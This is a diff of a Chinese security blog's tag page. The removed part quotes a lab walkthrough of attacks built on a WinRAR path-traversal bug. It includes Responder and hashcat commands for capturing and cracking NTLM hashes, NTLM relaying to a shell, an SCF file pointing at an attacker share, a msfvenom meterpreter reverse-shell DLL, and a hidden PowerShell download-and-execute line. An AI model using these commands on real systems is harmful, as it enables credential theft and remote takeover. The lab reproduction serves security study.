@@ -1,415 +1,255 @@
 <!doctype html>
-<html lang="zh-CN">
+<html>
 <head><meta name="generator" content="Hexo 3.8.0">
+    <!--Setting-->
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8">
-    <meta name="baidu-site-verification" content="dIcXMeY8Ya">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no">
     
-    <title>`漏洞复现`标签下的文章 | Kali-Team</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
-    <meta name="keywords" content="Kali-Team, 三米前有蕉皮">
-    <meta name="description" content="Kali-Team">
+    
+    <!--Simple SEO-->
+
+<meta name="description" content="人不折腾枉少年/">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>标签: 漏洞复现 | Kali-Team</title>
+
+<link rel="alternate" href="/atom.xml" title="Kali-Team" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
 
     
-    <link rel="alternative" href="/atom.xml" title="Kali-Team" type="application/atom+xml">
-    
-    
-    <link rel="shortcut icon" href="/favicon.ico">
-    
-    <link rel="stylesheet" href="/css/style.css">
-    <!--[if lt IE 9]>
-    <script src="/js/html5.js"></script>
-    <![endif]-->
-    
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/pages/archive.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/thirdParty/highlight/github.css">
 
+    
+    
+    
 </head>
 </html>
-<body class="home">
-    <!--[if lt IE 9]>
-    <div class="browsehappy">
-        当前网页 <strong>不支持</strong>
-        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.
-    </div>
-    <![endif]-->
+<body id="normal">
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<style>
+    header{ top: 71px; position: absolute!important;}
+    #container{padding-top: 151px!important;}
+</style>
+<div style="position:fixed;z-index:9999;left:0;top:0;width:100%;height:70px;background-color:#e0e0e0;color:#396CA5;border-bottom:1px solid #cecece;text-align:center;line-height:70px;white-space: nowrap;overflow: hidden;text-overflow: ellipsis">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
 
-    <!-- 博客头部 -->
-    <header class="header">
-    <section class="container header-main">
-        <div class="logo">
-            <a href="/">
-                <div class="cover">
-                    <span class="name">Kali-Team</span>
-                    <span class="description">三米前有蕉皮</span>
-                </div>
-            </a>
-        </div>
-        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
-        <ul class="menu hidden" id="JELON__menu">
+<div id="wrap">
+    <header style="position: absolute;">
+    <div id="site-meta">
+        <a href="/" id="logo">
+            <h1 class="title">Kali-Team</h1>
+        </a>
+        
+        <h2 class="subtitle">三米前有蕉皮</h2>
+        
+    </div>
+    <ul id="nav">
+        
+            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+        
+            <li><a href="/archives"><i class="fa fa-archive widget-title"></i>归档</a></li>
+        
+            <li><a href="/atom.xml"><i class="fa fa-rss"></i>RSS</a></li>
+        
+        <li id="search"><a href="javascript:void(0)"><i class="fa fa-search"></i>搜索</a></li>
+    </ul>
+</header>
+
+    <div id="container">
+        
+<ul id="sidebar">
+    
+    
+<li class="widget notification">
+    <i class="fa fa-bell-o"></i>
+    <div>
+        <br>
+- 人不折腾枉少年<br>
+- ID：三米前有蕉皮<br>
+- Team : Cora Laboratory / Kali-Team<br>
+- Tox：<img src="/img/Kali-Team.png" alt="Smiley face" width="42" height="42"><br>
+    </div>
+</li>
+
+    
+    
+<li class="widget widget-normal category">
+    <h3 class="fa fa-th widget-title">分类</h3>
+    <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Arch/"><i class="fa" aria-hidden="true">Arch</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/"><i class="fa" aria-hidden="true">CTF</i></a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/"><i class="fa" aria-hidden="true">Web</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/"><i class="fa" aria-hidden="true">工具</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/"><i class="fa" aria-hidden="true">漏洞复现</i></a><span class="category-list-count">1</span></li></ul>
+</li>
+
+
+    
+    
+<li class="widget widget-normal archive">
+  <h3 class="fa fa-archive widget-title">归档</h3>
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/"><i class="fa" aria-hidden="true">二月 2019</i></a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/"><i class="fa" aria-hidden="true">十月 2018</i></a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/"><i class="fa" aria-hidden="true">九月 2018</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/"><i class="fa" aria-hidden="true">八月 2018</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/"><i class="fa" aria-hidden="true">七月 2018</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/"><i class="fa" aria-hidden="true">六月 2018</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/"><i class="fa" aria-hidden="true">五月 2018</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/"><i class="fa" aria-hidden="true">四月 2018</i></a><span class="archive-list-count">2</span></li></ul>
+</li>
+
+
+    
+    
+    
+    
+<li class="widget widget-normal tags">
+  <h3 class="fa fa-tags widget-title">标签云</h3>
+  <div class="tagcloud-content">
+    
+      <a href="/tags/Arch/" style="font-size: 0.14rem; color: #69c">Arch</a> <a href="/tags/Genymotion/" style="font-size: 0.14rem; color: #69c">Genymotion</a> <a href="/tags/CTF/" style="font-size: 0.2rem; color: #0a407c">CTF</a> <a href="/tags/漏洞复现/" style="font-size: 0.14rem; color: #69c">漏洞复现</a> <a href="/tags/XSS/" style="font-size: 0.14rem; color: #69c">XSS</a> <a href="/tags/web/" style="font-size: 0.14rem; color: #69c">web</a> <a href="/tags/Linux/" style="font-size: 0.14rem; color: #69c">Linux</a> <a href="/tags/nmap/" style="font-size: 0.14rem; color: #69c">nmap</a> <a href="/tags/metasploit/" style="font-size: 0.14rem; color: #69c">metasploit</a>
+  </div>
+</li>
+
+
+    
+    
+<li class="widget widget-normal friends-link">
+    <h3 class="fa fa-globe widget-title">友链</h3><br>
+
+    
+        <a href="http://gh0st.cn/" class="fa" target="_blank">VulKey</a>
+
+    
+        <a href="https://10miaomiao.cn/" class="fa" target="_blank">飞跃</a>
+
+    
+        <a href="http://www.zmnihao.cn" class="fa" target="_blank">梓铭</a>
+
+    
+
+</li>
+
+    
+</ul>
+
+
+        <div id="main">
+    <div id="post-list">
+        <ul class="archives-post-list">
             
-            <li rel="/tags/漏洞复现/index.html" class="item ">
-                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
-            </li>
-            
-            <li rel="/tags/漏洞复现/index.html" class="item ">
-                <a href="/lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
-            </li>
-            
-            <li rel="/tags/漏洞复现/index.html" class="item ">
-                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
-            </li>
-            
-            <li rel="/tags/漏洞复现/index.html" class="item ">
-                <a href="/comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            <li class="post-items" _href="/2019/02/28/WinRAR代码执行复现与利用/">
+                
+                <p class="info">漏洞复现</p>
+                <h2 class="post-item-title">WinRAR代码执行复现与利用</h2>
+                <div class="article-meta">
+    
+    
+    <span class="categories-meta fa-wrap">
+            <i class="fa fa-folder-open-o"></i>
+        <span>漏洞复现</span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta ">2019/02/28</span>
+    </span>
+    
+    
+    
+</div>
+
             </li>
             
         </ul>
-        <div class="profile clearfix">
-            <div class="feeds fl">
-                
-                
-                <p class="links">
-                    
-                        <a href="https://github.com/cn-kali-team" target="_blank">Github</a>
-                        |
-                    
-                </p>
-                <p class="sns">
-                    
-                    <a href="javascript: void(0);" class="wechat">
-                        <b>■</b>
-                        公众号
-                        <span class="popover">
-                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
-                            <i class="arrow"></i>
-                        </span>
-                    </a>
-                </p>
-                
-            </div>
-            <div class="avatar fr">
-                <img src="/img/favicon.ico" alt="avatar" title="Kali-Team">
-            </div>
-        </div>
-    </section>
-</header>
-
-
-    <!-- 博客正文 -->
-    <div class="container body clearfix">
-        <section class="content">
-            <div class="content-main widget">
-                <!-- 按标签分类 -->
-
-    <h3 class="widget-hd">
-        <strong>
-            
-                `漏洞复现`标签下的文章
-            
-        </strong>
-    </h3>
-    
-        <!-- 文章 -->
-<article class="post">
-    <header>
-        <!-- 标签这有且只能显示一个 -->
-        
-        <a class="cat-link" href="/categories/漏洞复现/">漏洞复现</a>
-        
-        <!-- 文章标题 -->
-        
-    <h3 class="post-title">
-    	<a href="https://kali-team.cn/2019/02/28/WinRAR代码执行复现与利用/">
-    		WinRAR代码执行复现与利用
-    	</a>
-    </h3>
-
-    </header>
-    <p class="post-meta">
-        Kali-Team 发表于
-        <time datetime="2019-02-28T00:11:01.523Z">2019-02-28</time>
-        &nbsp;&nbsp;
-        <span class="post-tags">
-            标签：
-            
-    
-        <a href="/tags/漏洞复现/" title="漏洞复现">漏洞复现</a>
-    
-
-        </span>
-    </p>
-
-    <div class="post-content">
-        <div class="post-excerpt">
-            
-                <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><table>
-<thead>
-<tr>
-<th></th>
-<th>IP</th>
-<th>工具</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>攻击主机：Arch</td>
-<td>192.168.56.1</td>
-<td>很多，下文讲到</td>
-</tr>
-<tr>
-<td>域控：Windows 2008 R2</td>
-<td>192.168.56.108</td>
-<td></td>
-</tr>
-<tr>
-<td>目标主机：Windows7*2</td>
-<td>192.168.56.106/107</td>
-<td></td>
-</tr>
-<tr>
-<td>CobaltStrike：Ubuntu16.04</td>
-<td>192.168.56.109</td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li><strong>作者：三米前有蕉皮</strong> </li>
-<li><strong>博客：<a href="https://kali-team.cn">https://kali-team.cn</a></strong></li>
-<li><strong>B站：<a href="https://www.bilibili.com/video/av44889268" target="_blank" rel="noopener">https://www.bilibili.com/video/av44889268</a></strong></li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
-<li>穿透目录释放文件到开机启动菜单这些我就不演示了。</li>
-<li>获取受害者的Net NTLM Hash</li>
-<li>借助下载文件夹安装程序DLL劫持</li>
-<li>投放恶意的 LNK 文件</li>
-<li>…</li>
-</ol>
-<h2 id="获取受害者的Net-NTLM-Hash"><a href="#获取受害者的Net-NTLM-Hash" class="headerlink" title="获取受害者的Net-NTLM Hash"></a>获取受害者的Net-NTLM Hash</h2><ul>
-<li><p>什么是Net NTLM Hash？请看<a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">倾旋的博客</a></p>
-</li>
-<li><p>工具：<a href="https://github.com/lgandx/responder/" target="_blank" rel="noopener">responder</a>、<a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">hashcat</a></p>
-</li>
-</ul>
-<h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><ul>
-<li><p>先查看配置文件<code>/usr/share/responder/Responder.conf</code>，检查SMB服务是否为On。</p>
-</li>
-<li><p>我的虚拟机使用的网卡是vboxnet0，需要root权限。通过使用参数-I指定网卡运行</p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo responder -I vboxnet0 -wrfv --lm</span><br></pre></td></tr></table></figure>
-<p><img src="WinRAR代码执行复现与利用.assets/1551196844959.png" alt="1551196844959"></p>
-<ul>
-<li>在这可看到IP地址为192.168.56.106的主机通过SMB共享访问了我的Arch，并获取到了用户名和Net NTLM Hash。</li>
-<li>获取到Net NTLM Hash之后可以使用HashCat来暴力破解，在现在计算机性能这么强大的时代，就我的Intel 的破CPU都能跑1277.4 kH/s，不过之前要安装OpenCL的库，如果是用显卡跑就更快了。</li>
-<li>把最后一个Hash复制出来</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Win7::Win7-PC:8a6ee201f1d2b55d:9F6527FB57FF8D60180A1D833D7CAC04:0101000000000000619F9D50ECCDD401682645F91DB02E7500000000020000000000000000000000</span><br></pre></td></tr></table></figure>
-<ul>
-<li>查看加密算法模块对应的编号，上面看到的是<code>NTLMv2</code>，所以我们使用5600</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ hashcat --<span class="built_in">help</span>|grep NTLM</span><br><span class="line">   5500 | NetNTLMv1                                        | Network Protocols</span><br><span class="line">   5500 | NetNTLMv1+ESS                                    | Network Protocols</span><br><span class="line">   5600 | NetNTLMv2                                        | Network Protocols</span><br><span class="line">   1000 | NTLM                                             | Operating Systems</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
-<p><img src="WinRAR代码执行复现与利用.assets/1551197797107.png" alt="1551197797107"></p>
-<ul>
-<li>截图上面我标记出来的就是密码了，只要你的字典够强大，我的字典只有一万行，一秒都不用就跑完了。</li>
-<li>拿到密码就可以登录上去或者执行各种命令都是可以的。</li>
-</ul>
-<h3 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h3><ul>
-<li>如果目标是域控就可以使用Hash中继来直接登录域内的主机。</li>
-<li>还是打开responder的配置文件，这次是把HTTP和SMB服务改成Off，因为等一下用到另一个工具的时候要监听445和80端口。</li>
-<li>工具：MultiRelay.py，在responder的tool目录下。</li>
-<li>最好先切换到responder目录下，因为在获取到Windows的Shell的时候要使用MultiRelay目录里的工具。</li>
-</ul>
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ <span class="keyword">cd</span> <span class="string">/usr/share/responder/tools</span></span><br><span class="line">➜  tools sudo python2 <span class="string">./MultiRelay.py</span> -t 192.168.56.106 -u ALL</span><br></pre></td></tr></table></figure>
-<ul>
-<li>-t后面接着是你想攻击主机的IP地址，-u是用户名，这里选择所有，就是ALL。</li>
-<li>再打开一个终端，执行<code>➜  ~ sudo responder -I vboxnet0 -wrfv --lm</code></li>
-<li>现在只要域控访问了Arch监听的SMB服务，就可以获取域控的Net NTLM Hash，这样就可以登录域内的主机了，基本是指哪打哪。</li>
-</ul>
-<p><img src="WinRAR代码执行复现与利用.assets/1551199087627.png" alt="1551199087627"></p>
-<ul>
-<li>截图上市已经拿到了主机：192.168.56.106的权限了，可以继续使用神器读取明文密码。但是这里上传到主机的被火绒拦截了，这也说明真的是可以控制的。</li>
-</ul>
-<p><img src="WinRAR代码执行复现与利用.assets/1551199449387.png" alt="1551199449387"></p>
-<ul>
-<li>关掉火绒试试，上传成功并获取到了明文密码。</li>
-</ul>
-<p><img src="WinRAR代码执行复现与利用.assets/1551199656772.png" alt="1551199656772">更多好玩的东西，自己挖掘。。。</p>
-<h3 id="释放SCF文件"><a href="#释放SCF文件" class="headerlink" title="释放SCF文件"></a>释放SCF文件</h3><ul>
-<li><p>工具：<a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">impacket</a></p>
-</li>
-<li><p>还有一种释放.scf文件获取目标的Net NTLM Hash的，释放到磁盘的根目录，只要打开我的电脑就会访问攻击者的SMB服务，获取Hash一把梭。</p>
-</li>
-<li></li>
-</ul>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Shell]</span></span><br><span class="line"><span class="attr">Command</span>=<span class="number">2</span></span><br><span class="line"><span class="attr">IconFile</span>=\\<span class="number">192.168</span>.<span class="number">56.1</span>\icon.ico</span><br><span class="line"><span class="section">[Taskbar]</span></span><br><span class="line"><span class="attr">Command</span>=ToggleDesktop</span><br></pre></td></tr></table></figure>
-<ul>
-<li>当然还有desktop.ini、autorun.inf这些可以设置icon图标和设置文件夹的背景图片的，也可以使用file协议远程加载攻击者的SMB服务，高中就经常设置U盘图标和U盘的背景图片装逼的了，没想到现在还有这些用处。</li>
-</ul>
-<h2 id="借助下载文件夹安装程序DLL劫持"><a href="#借助下载文件夹安装程序DLL劫持" class="headerlink" title="借助下载文件夹安装程序DLL劫持"></a>借助下载文件夹安装程序DLL劫持</h2><ul>
-<li>DLL劫持是什么？还是看<a href="http://payloads.online/archivers/2018-06-09/1" target="_blank" rel="noopener">倾旋的博客</a></li>
-<li>因为WinRAR这个跨文件目录释放的漏洞本来就不怎么容易利用，而且DLL劫持也需要知道别人电脑里有什么软件，还得知道别人装的软件哪里存在DLL劫持。这真的是难上加难了。所以下面的思路仅供脑补，会有很多很多假设。</li>
-<li>既然我们不知道目标主机上有什么软件，那就要找一个比较通用的DLL，然后发现很多安装包程序就存在很多DLL劫持漏洞，在测试时发现了阿里几个客户端都存在DLL劫持，甚至连我想安装的火绒杀毒软件也存在同样的问题。那我就推测是不是打包成安装包的工具有问题。</li>
-<li><p>下面是我测试安装包，存在DLL劫持的，我只是测试了几个，这么巧，这几个都存在DLL劫持。</p>
-</li>
-<li><p>旺旺客户端的</p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\CRYPTBASE.dll</span><br><span class="line">C:\Windows\system32\WindowsCodecs.dll</span><br><span class="line">C:\Windows\system32\SspiCli.dll</span><br><span class="line">C:\Windows\system32\dwmapi.dll</span><br><span class="line">C:\Windows\system32\ntmarta.dll</span><br><span class="line">C:\Windows\system32\dnsapi.DLL</span><br><span class="line">C:\Windows\system32\iphlpapi.DLL</span><br><span class="line">C:\Windows\system32\RASAPI32.dll</span><br><span class="line">C:\Windows\system32\rtutils.dll</span><br><span class="line">C:\Windows\system32\sensapi.dll</span><br><span class="line">C:\Windows\system32\rasadhlp.dll</span><br><span class="line">C:\Windows\system32\VERSION.dll</span><br></pre></td></tr></table></figure>
-<ul>
-<li>千牛客户端的</li>
-</ul>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\C</span>RYPTBASE.dll</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\S</span>HFOLDER.DLL</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\n</span>tmarta.dll</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\d</span>wmapi.dll</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>钉钉还有火绒也差不多和上面的一样，但是在测试时卡死了N次</p>
-</li>
-<li><p>在测试了上面几个安装包后统计出来一个特点，你会发现DLL全部是大写字母的，非常的通用，SHFOLDER.DLL可以支持三个安装包的劫持效果。旺旺的可以使用RASAPI32.dll。</p>
-</li>
-<li>而且这些安装包会在一个比较固定的目录，那就是下载文件夹。假设我利用WinRAR的跨目录释放了一个DLL到了下载文件夹这个目录，然后用户从上面这些客户端的安装包官方网站下载的正常文件回来，下载完了直接点击打开运行，这样就会加载我释放出来的DLL，达到攻击的目的。</li>
-<li>下面开始演示一次，工具：一个DLL文件。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LPORT=7788 LHOST=192.168.56.1 -a x86 -f dll &gt;WinRAR.dll</span><br></pre></td></tr></table></figure>
-<ul>
-<li>MSF生成一个DLL有一个问题劫持了之后安装包不能正常运行，这是DLL的问题，自己写的应该就不会了。</li>
-<li>或者使用CobaltStrike生成的DLL可以正常安装，但是要做好进程迁移，因为安装包结束了，子进程也会跟着关闭，这样就控制不了了，免杀是硬伤。。。</li>
-</ul>
-<h2 id="投放LNK文件"><a href="#投放LNK文件" class="headerlink" title="投放LNK文件"></a>投放LNK文件</h2><ul>
-<li>只是一个思路：在CobaltStrike里使用PowerShell远程加载。</li>
-</ul>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\W</span>indowsPowerShell<span class="symbol">\v</span>1.0<span class="symbol">\p</span>owershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.56.109:80/a'))"</span><br></pre></td></tr></table></figure>
-<ul>
-<li>关键是没几个人会点了，一般弄一个常见的快捷键什么都会被杀毒软件拦截。这个方法就算凑个数吧。</li>
-</ul>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/incredibleindishell/Windows-AD-environment-related/tree/master/Responder" target="_blank" rel="noopener">https://github.com/incredibleindishell/Windows-AD-environment-related/tree/master/Responder</a></p>
-<p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</a></p>
-
-            
-            <p class="more">
-                <a href="https://kali-team.cn/2019/02/28/WinRAR代码执行复现与利用/">阅读剩下更多</a>
-            </p>
-        </div>
-        <div class="post-thumbnail" data-img>
-            <a href="https://kali-team.cn/2019/02/28/WinRAR代码执行复现与利用/" title="WinRAR代码执行复现与利用">
-                
-                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/8.jpg" alt="默认配图">
-                
-            </a>
-        </div>
     </div>
-</article>
-
-    
-
-    
-    <nav class="page-navigator">
-        <span class="page-number current">1</span>
-    </nav>
-    
-
-
-            </div>
-
-        </section>
-        <!-- 侧栏部分 -->
-<aside class="sidebar">
-    <section class="widget">
-        <h3 class="widget-hd"><strong>文章分类</strong></h3>
-        <!-- 文章分类 -->
-<ul class="widget-bd">
-    
-    <li>
-        <a href="/categories/Arch/">Arch</a>
-        <span class="badge">(1)</span>
-    </li>
-    
-    <li>
-        <a href="/categories/工具/">工具</a>
-        <span class="badge">(1)</span>
-    </li>
-    
-    <li>
-        <a href="/categories/漏洞复现/">漏洞复现</a>
-        <span class="badge">(1)</span>
-    </li>
-    
-    <li>
-        <a href="/categories/CTF/">CTF</a>
-        <span class="badge">(11)</span>
-    </li>
-    
-    <li>
-        <a href="/categories/Web/">Web</a>
-        <span class="badge">(1)</span>
-    </li>
-    
-</ul>
-    </section>
-
-    
-    <section class="widget">
-        <h3 class="widget-hd"><strong>热门标签</strong></h3>
-        <!-- 文章标签 -->
-<div class="widget-bd tag-wrap">
-  
-    <a class="tag-item" href="/tags/Arch/" title="Arch">Arch (1)</a>
-  
-    <a class="tag-item" href="/tags/Genymotion/" title="Genymotion">Genymotion (1)</a>
-  
-    <a class="tag-item" href="/tags/漏洞复现/" title="漏洞复现">漏洞复现 (1)</a>
-  
-    <a class="tag-item" href="/tags/CTF/" title="CTF">CTF (11)</a>
-  
-    <a class="tag-item" href="/tags/XSS/" title="XSS">XSS (1)</a>
-  
-    <a class="tag-item" href="/tags/web/" title="web">web (1)</a>
-  
-    <a class="tag-item" href="/tags/Linux/" title="Linux">Linux (1)</a>
-  
-    <a class="tag-item" href="/tags/nmap/" title="nmap">nmap (1)</a>
-  
-    <a class="tag-item" href="/tags/metasploit/" title="metasploit">metasploit (1)</a>
-  
 </div>
-    </section>
-    
 
-    
 
-    
-    <!-- 友情链接 -->
-    <section class="widget">
-        <h3 class="widget-hd"><strong>友情链接</strong></h3>
-        <!-- 文章分类 -->
-<ul class="widget-bd">
-    
-        <li>
-            <a href="https://gh0st.cn/" target="_blank" title="陈的博客">VulKey</a>
-        </li>
-    
-        <li>
-            <a href="https://10miaomiao.cn/" target="_blank" title="10喵喵的世界">飞跃</a>
-        </li>
-    
-        <li>
-            <a href="http://www.zmnihao.cn/" target="_blank" title="梓铭你好">梓铭</a>
-        </li>
-    
-</ul>
-    </section>
-    
-</aside>
-<!-- / 侧栏部分 -->
+
+
     </div>
-
-    <!-- 博客底部 -->
-    <footer class="footer">
-    &copy;
+    <footer id="footer">
     
-        2016-2019
+    <div class="social">
+        
+        <a href="https://github.com/cn-kali-team" class="fa fa-github" target="_blank" title="GitHub"></a>
+        
+        <a href="mailto:root@kali-team.cn" class="fa fa-envelope-square" target="_blank" title="Email"></a>
+        
+    </div>
+    
+    <div>
+        
+        <a href="/" class="copyright-links">Kali-Team</a>&copy;2017 - 2019.All Rights
+        Reserved.
+    </div>
+    <p>Powered by <a href="https://hexo.io" class="copyright-links" target="_blank">Hexo</a> | Theme by <a href="https://github.com/GeekaholicLin" class="copyright-links" target="_blank">GeekaholicLin</a>
+    </p>
     
 </footer>
-<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
 
-    <!--博客js脚本 -->
-    <!-- 这里放网站js脚本 -->
-<script src="/js/main.js"></script>
+</div>
+    <ul id="tools">
+    <li class="totop-btn fa fa-angle-up"></li>
+    <li class="exchange-btn fa fa-exchange"></li>
+  
+    
+
+    
+</ul>
+<p id="process"></p>
+<div id="search-overlay">
+    <div class="search-area-wrap">
+        <div id="search-area">
+            <div class="input-wrap focus">
+                <i class="fa fa-search" aria-hidden="true"></i>
+                <input id="search-input" autofocus autocomplete="off" type="text" placeholder="search this website...">
+            </div>
+            <ul id="search-result">
+                <li class="load-first"><i class="fa fa-spinner fa-pulse"></i></li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+
+
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    //theme config datas
+    var copyrightObj = {};
+    copyrightObj.enable = 'true';
+    copyrightObj.triggerCopyLength = '200';
+    copyrightObj.appendText = '商业转载请联系作者获得授权,非商业转载请注明出处 © example';
+    var leancloudObj = {};
+    leancloudObj.enable = 'false';
+    leancloudObj.className = 'BlogCounter';
+    leancloudObj.limits = '10';
+</script>
+<script type="text/javascript">
+    var search = {};
+    var search_path = "search.xml";
+    if (!search_path) {
+        search_path = "search.xml";
+    }
+    search.path = "/" + search_path;
+    search.func =  _ajax.init();
+</script>
+<script src="/js/app.js"></script>
+
+
 </body>
 </html>
